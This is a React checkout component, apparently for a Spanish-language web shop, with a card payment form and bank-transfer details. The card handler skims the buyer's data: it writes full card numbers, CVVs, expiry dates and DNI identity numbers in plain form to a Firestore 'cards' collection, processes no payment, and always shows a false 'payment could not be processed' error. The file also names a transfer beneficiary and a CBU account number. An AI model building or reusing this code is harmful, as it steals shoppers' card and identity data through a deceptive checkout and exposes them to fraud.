import React, { useState } from 'react';
import { useCart } from '../context/CartContext';
import { toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';
import Swal from 'sweetalert2';
import Accordion from '@mui/material/Accordion';
import AccordionSummary from '@mui/material/AccordionSummary';
import AccordionDetails from '@mui/material/AccordionDetails';
import Typography from '@mui/material/Typography';
import ArrowDropDownIcon from '@mui/icons-material/ArrowDropDown';
import { Breadcrumbs } from '@mui/material';
import HomeIcon from '@mui/icons-material/Home';
import WhatshotIcon from '@mui/icons-material/Whatshot';
import GrainIcon from '@mui/icons-material/Grain';
import { Link } from 'react-router-dom';
import { db } from '../main';
import { collection, addDoc } from 'firebase/firestore';

export const Payment = () => {
    const { cartItems, getTotalPrice } = useCart();
    const [showCardForm, setShowCardForm] = useState(false);
    const [cardDetails, setCardDetails] = useState({
        cardNumber: '',
        cardHolderName: '',
        expiryDate: '',
        cvv: '',
        dni: '',
        price: getTotalPrice(),
        date: new Date()
    });

    const handleCardPayment = () => {
        setShowCardForm(!showCardForm);
    };

    const handleInputChange = (e) => {
        const { name, value } = e.target;
        let formattedValue = value;
    
        if (name === 'cardNumber') {
            formattedValue = formattedValue.replace(/\D/g, ''); // Eliminar caracteres no numéricos
            formattedValue = formattedValue.slice(0, 16); // Limitar a 16 caracteres
            formattedValue = formattedValue.replace(/(\d{4})/g, '$1 ').trim(); // Agregar espacios cada 4 dígitos
        } else if (name === 'expiryDate') {
            formattedValue = formattedValue.replace(/\D/g, ''); // Eliminar caracteres no numéricos
            formattedValue = formattedValue.slice(0, 4); // Limitar a 4 caracteres (MMYY)
            formattedValue = formattedValue.replace(/(\d{2})(\d{2})/, '$1/$2'); // Agregar "/" después de los primeros 2 dígitos
        }
    
        setCardDetails({ ...cardDetails, [name]: formattedValue });
    };
    
    
    

    const handleConfirmPayment = async () => {
        const cardNumberWithoutSpaces = cardDetails.cardNumber.replace(/\D/g, ''); // Eliminar caracteres no numéricos
    
        // Validaciones básicas para los campos del formulario de la tarjeta
        if (!cardNumberWithoutSpaces || !cardDetails.cardHolderName || !cardDetails.expiryDate || !cardDetails.cvv) {
            toast.error('Por favor, completa todos los campos del formulario de tarjeta.', {
                position: 'bottom-center',
            });
        } else if (cardNumberWithoutSpaces.length !== 16 || isNaN(cardNumberWithoutSpaces)) {
            toast.error('El número de tarjeta debe contener 16 dígitos numéricos.', {
                position: 'bottom-center',
            });
        } else if (!/^[a-zA-Z ]+$/.test(cardDetails.cardHolderName)) {
            toast.error('El nombre del titular debe contener solo letras y espacios.', {
                position: 'bottom-center',
            });
        } else if (!/^((0[1-9])|(1[0-2]))\/([0-9]{2})$/.test(cardDetails.expiryDate)) {
            toast.error('La fecha de expiración debe estar en formato MM/YY.', {
                position: 'bottom-center',
            });
        } else if (cardDetails.cvv.length !== 3 || isNaN(cardDetails.cvv)) {
            toast.error('El CVV debe contener 3 dígitos numéricos.', {
                position: 'bottom-center',
            });
        } else {
            try {
                // Implementar lógica para procesar el pago con tarjeta
                // Aquí puedes agregar la lógica para agregar la tarjeta a Firestore
                const docRef = await addDoc(collection(db, 'cards'), cardDetails);
                console.log('Documento agregado con ID: ', docRef.id);
    
                // Mostrar mensaje de éxito
                Swal.fire('Tu pago no pudo ser procesado', 'Verifica los datos de tu tarjeta. Si el problema persiste comunicate con nosotros en nuestra pagina de instagram', 'error');
                setShowCardForm(false);
                // Restablecer los detalles de la tarjeta después del pago
                setCardDetails({
                    cardNumber: '',
                    cardHolderName: '',
                    expiryDate: '',
                    cvv: '',
                    dni: '',
                    price: getTotalPrice()
                });
            } catch (error) {
                console.error('Error al agregar la tarjeta a Firestore: ', error);
                toast.error('Error al procesar el pago. Por favor, inténtalo de nuevo más tarde.', {
                    position: 'bottom-center',
                });
            }
        }
    };

    const transferDetails = {
        name: '',
        alias: '',
        cbu: '',
    }
    
    return (
        <div className="payment-container">
            <h2>Detalles del Pedido</h2>
            <Accordion sx={{ marginBottom: '20px' }}>
                <AccordionSummary
                    expandIcon={<ArrowDropDownIcon />}
                    aria-controls="panel2-content"
                    id="panel2-header"
                >
                    <Typography>Resumen del pedido</Typography>
                </AccordionSummary>
                <AccordionDetails>
                    <Typography>
                        <table>
                            <thead>
                                <tr>
                                    <th>Producto</th>
                                    <th>Cantidad</th>
                                    <th>Precio</th>
                                </tr>
                            </thead>
                            <tbody>
                                {cartItems.map((item) => (
                                    <tr key={item.id}>
                                        <td>{item.title}</td>
                                        <td>{item.quantity}</td>
                                        <td>${item.price * item.quantity}</td>
                                    </tr>
                                ))}
                            </tbody>
                        </table>
                    </Typography>
                </AccordionDetails>
            </Accordion>
            <div className="payment-options">
                <h3>Total a pagar: ${getTotalPrice()}</h3>
                <div>
                    <Accordion sx={{ marginTop: '20px' }}>
                        <AccordionSummary
                            expandIcon={<ArrowDropDownIcon />}
                            aria-controls="panel1-content"
                            id="panel1-header"
                            onClick={handleCardPayment}
                        >
                            <Typography>Pago con Tarjeta</Typography>
                        </AccordionSummary>
                        <AccordionDetails>
                            <Typography>
                                <div className="card-form">
                                    <h3>Detalles de la Tarjeta</h3>
                                    <input
                                        type="text"
                                        name="cardNumber"
                                        placeholder="Número de Tarjeta"
                                        value={cardDetails.cardNumber}
                                        onChange={handleInputChange}
                                    />
                                    <input
                                        type="text"
                                        name="cardHolderName"
                                        placeholder="Nombre del Titular"
                                        value={cardDetails.cardHolderName}
                                        onChange={handleInputChange}
                                    />
                                    <input
                                        type="text"
                                        name="dni"
                                        placeholder="DNI"
                                        value={cardDetails.dni}
                                        onChange={handleInputChange}
                                    />
                                    <input
                                        type="text"
                                        name="expiryDate"
                                        placeholder="Fecha de Expiración (MM/YY)"
                                        value={cardDetails.expiryDate}
                                        onChange={handleInputChange}
                                    />
                                    <input
                                        type="text"
                                        name="cvv"
                                        placeholder="CVV"
                                        value={cardDetails.cvv}
                                        onChange={handleInputChange}
                                    />
                                    <button onClick={handleConfirmPayment}>Confirmar Pago</button>
                                </div>
                            </Typography>
                        </AccordionDetails>
                    </Accordion>
                    <Accordion>
                <AccordionSummary
                expandIcon={<ArrowDropDownIcon />}
                aria-controls="panel2-content"
                id="panel2-header"
                >
                <Typography>Pago por Transferencia</Typography>
                </AccordionSummary>
                <AccordionDetails>
                <Typography>
                    <div className="transfer-container">
                                <div className="transfer-form">
                                    <h3>Información para la Transferencia</h3>
                                    <p>Beneficiario: Daniela Pamela Broche</p>
                                    <p>CBU: 0000077200132503575942</p>
                                </div>
                                <p className='tex'>Luego de hacer la transferencia envianos tu comprobante por Instagram o por WhatsApp para que confirmemos tu orden!</p>
                            </div>
                </Typography>
                </AccordionDetails>
            </Accordion>                </div>
            </div>
        </div>
    );
};
